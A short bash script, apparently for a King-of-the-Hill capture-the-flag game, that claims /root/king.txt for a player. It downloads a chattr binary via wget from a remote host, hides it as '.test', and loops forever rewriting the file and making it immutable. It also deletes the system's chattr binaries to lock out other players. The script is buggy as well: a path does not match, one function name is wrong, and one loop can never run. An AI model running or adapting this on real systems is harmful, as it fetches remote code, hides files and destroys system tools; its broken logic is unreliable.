#!/usr/bin/env bash
# @author : M3tr1c_r00t

echo """
 __  __ _____ _        _           ____        ___  _   _____      _   _ 
|  \/  |___ /| |_ _ __/ | ___     |  _ \ _ __ / _ \| |_|___ /  ___| |_| |
| |\/| | |_ \| __| '__| |/ __|____| |_) | '__| | | | __| |_ \ / __| __| |
| |  | |___) | |_| |  | | (_|_____|  __/| |  | |_| | |_ ___) | (__| |_|_|
|_|  |_|____/ \__|_|  |_|\___|    |_|   |_|   \___/ \__|____/ \___|\__(_) v.1.0.0 
                                                                         
"""

#echo "Enter your Ali@s..."
#read alias
alias=MetricCode

echo $alias

echo "Get chattr?"
echo "yes/no"
read x


if [ $x == no ]; then
	echo "OK..."
else
	echo "getting your chattr file...."
	echo "working port 1111"
	sleep 3
	wget http://10.8.4.8:1111/chattr_Binary/chattr 
	mv chattr .test
	chmod +x .test
	chmod 777 .test
	sleep 0.5
	echo "Your chattr binary is ready..."
fi


protect() {
	echo $alias > /root/king.txt
	chmod 000 /root/king.txt
	/dev/shm/.test +i /root/king.txt
	set -o noclobber /root/king.txt
}

remove() {

	rm /usr/bin/chattr
	rm /dev/shm/chattr
}
while true; do protect; sleep 0.1; done
while true; do remover;sleep 5;done
